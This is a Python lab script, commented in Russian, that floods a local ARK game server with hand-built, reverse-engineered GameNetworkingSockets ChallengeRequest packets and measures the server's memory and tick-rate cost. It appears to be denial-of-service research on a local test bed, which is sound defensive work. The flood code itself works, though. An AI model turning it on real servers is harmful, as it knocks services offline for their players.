# -*- coding: utf-8 -*-
"""
ark_lab_gns_challenge_flood.py — измерение стоимости одного GNS-пакета на стороне сервера.

Что измеряем (вектор №3 «1 пакет = 1 соединение»):
  * сервер ОТВЕЧАЕТ на незашифрованный ChallengeRequest (проверено: 0x21 ChallengeReply);
  * на каждый ChallengeRequest сервер делает find-or-create записи о соединении
    (Ghidra: FUN_1800251F0 -> FUN_18002EF50 = SipHash-2-4 по ключу соединения);
  * на успешный ConnectRequest сервер выделяет operator_new(0x33e8) = 13 КБ
    (Ghidra: FUN_1800253A0) и заводит p2p-запись по SteamID.

Скрипт шлёт N ChallengeRequest с уникальными connection_id (уникальный ключ),
считает ответы сервера и меряет WorkingSet сервера (метрика memKB плагина NetGuard)
и TPS до/после. Только локальный стенд (192.168.8.218).

Формат кадра (из диспетчера GameNetworkingSockets, FUN_180024E00):
    [0x20]                   k_ESteamNetworkingUDPMsg_ChallengeRequest
    [uint16 LE length]       длина protobuf
    [protobuf]               CMsgSteamSockets_UDP_ChallengeRequest
    [padding до 512 байт]    "must be padded to at least 0x200 bytes"
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ark_lab_metrics import NetGuardClient  # noqa: E402

MSG_CHALLENGE_REQUEST = 32
MSG_CHALLENGE_REPLY = 33


def varint(v: int) -> bytes:
    out = bytearray()
    while True:
        b = v & 0x7F
        v >>= 7
        out.append(b | (0x80 if v else 0))
        if not v:
            return bytes(out)


def pb_challenge_request(connection_id: int, timestamp: int, version: int = 1) -> bytes:
    """CMsgSteamSockets_UDP_ChallengeRequest (protobuf wire-формат)."""
    body = bytearray()
    body += b"\x0d" + struct.pack("<I", connection_id)   # field 1: connection_id (fixed32)
    body += b"\x19" + struct.pack("<Q", timestamp)        # field 3: my_timestamp (fixed64)
    body += b"\x20" + varint(version)                    # field 4: protocol_version (varint)
    return bytes(body)


def gns_frame(connection_id: int, timestamp: int, version: int = 1, pad_to: int = 512) -> bytes:
    pb = pb_challenge_request(connection_id, timestamp, version)
    out = bytearray([MSG_CHALLENGE_REQUEST])
    out += struct.pack("<H", len(pb))
    out += pb
    if len(out) < pad_to:
        out += b"\x00" * (pad_to - len(out))
    return bytes(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="Флуд GNS ChallengeRequest: замер состояния на сервере")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=2000, help="сколько ChallengeRequest отправить")
    ap.add_argument("--rate", type=float, default=0.0, help="пакетов в секунду (0 = без ограничения)")
    ap.add_argument("--sockets", type=int, default=1, help="сколько исходящих сокетов (портов) использовать")
    ap.add_argument("--wait", type=float, default=3.0, help="пауза после флуда перед замером")
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()

    def st():
        s = m.status()
        return s

    b = st()
    print("до      : memKB=%s tps=%s live=%s dead=%s total=%s pkt=%s" % (
        b.get("memKB"), b.get("tps"), b.get("liveConnections"), b.get("deadConnections"),
        b.get("totalConnections"), b.get("packetsReceived")))

    socks = []
    for _ in range(max(1, args.sockets)):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("0.0.0.0", 0))
        s.setblocking(False)
        socks.append(s)

    t0 = time.time()
    sent = 0
    replies = 0
    base_id = int(time.time() * 1000) & 0xFFFFFF
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    next_t = t0
    while sent < args.count:
        now = time.time()
        if interval and now < next_t:
            time.sleep(min(interval, next_t - now))
            next_t += interval
        else:
            next_t = now
        s = socks[sent % len(socks)]
        # уникальный connection_id => уникальный ключ в карте соединений сервера
        frame = gns_frame(base_id + sent, int(time.time() * 1000) & 0xFFFFFFFFFFFF)
        try:
            s.sendto(frame, (args.host, args.game_port))
        except OSError:
            pass
        sent += 1
        # забираем ответы
        for _sock in socks:
            while True:
                try:
                    data, _addr = _sock.recvfrom(4096)
                except (BlockingIOError, OSError):
                    break
                replies += 1
                if replies <= 3:
                    print("   ответ: %d Б: %s" % (len(data), data[:32].hex()))
    dt = time.time() - t0

    # даём серверу обработать + собрать память
    time.sleep(args.wait)
    a = st()
    for s in socks:
        s.close()

    dmem = (a.get("memKB") or 0) - (b.get("memKB") or 0)
    print("отправлено %d за %.2f с (%.0f pps), ответов получено %d" % (sent, dt, sent / dt if dt else 0, replies))
    print("после   : memKB=%s tps=%s live=%s dead=%s total=%s pkt=%s" % (
        a.get("memKB"), a.get("tps"), a.get("liveConnections"), a.get("deadConnections"),
        a.get("totalConnections"), a.get("packetsReceived")))
    print("Δ memKB = %+d  (%.1f КБ на пакет при %d ответах)" % (dmem, dmem / max(1, replies), replies))
    print("Δ packetsReceived = %+d" % ((a.get("packetsReceived") or 0) - (b.get("packetsReceived") or 0)))
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
